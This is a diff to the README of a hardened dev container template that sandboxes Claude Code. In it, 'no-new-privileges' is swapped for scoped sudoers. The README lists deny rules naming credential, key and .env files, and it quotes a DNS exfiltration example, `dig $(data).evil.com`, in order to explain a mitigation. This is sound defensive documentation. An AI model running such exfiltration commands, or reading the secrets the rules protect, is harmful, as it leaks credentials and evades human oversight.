@@ -49,7 +49,7 @@ A hardened, production-ready dev container template that gives your team:
 |   ~/.ssh (NOT mounted)|          |   Non-root user: "developer"    |
 |   ~/.aws (NOT mounted)|          |   Egress firewall: default-deny |
 |                       |          |   Managed settings: enforced    |
-|   docker.sock (NEVER) |          |   no-new-privileges, pids limit |
+|   docker.sock (NEVER) |          |   scoped sudoers, pids limit    |
 +-----------------------+          +----------------------------------+
 ```
 
@@ -64,7 +64,7 @@ This template implements defence in depth with multiple security layers, drawing
 | **Read-only .devcontainer** | `.devcontainer/` is mounted read-only inside the container, preventing Claude from modifying its own sandbox config. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) |
 | **Deny rules (managed settings)** | Managed settings deny Claude from reading/editing `.devcontainer/**`, `.env*`, `*.pem`, `*credentials*`, `.claude/settings.json`, `.git/hooks/**`, `.github/workflows/**`. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer), security audit |
 | **Bypass mode disabled** | `disableBypassPermissionsMode: "disable"` prevents `--dangerously-skip-permissions` from nullifying all deny rules. | Security audit |
-| **Cap-drop ALL + selective add** | All Linux capabilities dropped, only `NET_ADMIN` and `NET_RAW` added back (for firewall). `no-new-privileges` prevents privilege escalation. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), [centminmod](https://github.com/centminmod/claude-code-devcontainers) |
+| **Cap-drop ALL + selective add** | All Linux capabilities dropped, only `NET_ADMIN` and `NET_RAW` added back (for firewall). Scoped sudoers limits root access to two whitelisted scripts only. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), [centminmod](https://github.com/centminmod/claude-code-devcontainers) |
 | **Resource limits** | `pids-limit=256`, `memory=8g`, `ulimit nofile=1024:4096`, `ulimit core=0` (no core dumps). | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), security audit |
 | **DNS tunneling mitigation** | DNS restricted to Docker's embedded resolver at `127.0.0.11` only. Prevents exfiltration via `dig $(data).evil.com`. | Security audit |
 | **Cloud metadata blocking** | Explicit REJECT rules for `169.254.169.254` and `169.254.169.253` (AWS/Azure/GCP metadata). | Security audit |
@@ -214,7 +214,7 @@ For a composable, language-aware approach, see [smithclay/claudetainer](https://
 | Read-only .devcontainer mount | Yes | Yes | -- | -- | -- |
 | Deny Read(.devcontainer/**) | Yes | Yes | -- | -- | -- |
 | Cap-drop ALL | Yes | -- | Yes | Yes | -- |
-| no-new-privileges | Yes | -- | Yes | -- | -- |
+| no-new-privileges | -- | -- | Yes | -- | -- |
 | Resource limits (pids, memory) | Yes | -- | Yes | -- | -- |
 | Supply chain hardening (bun/npm) | Yes | Yes | -- | -- | -- |
 | Scoped sudoers (least-privilege) | Yes | -- | -- | -- | -- |
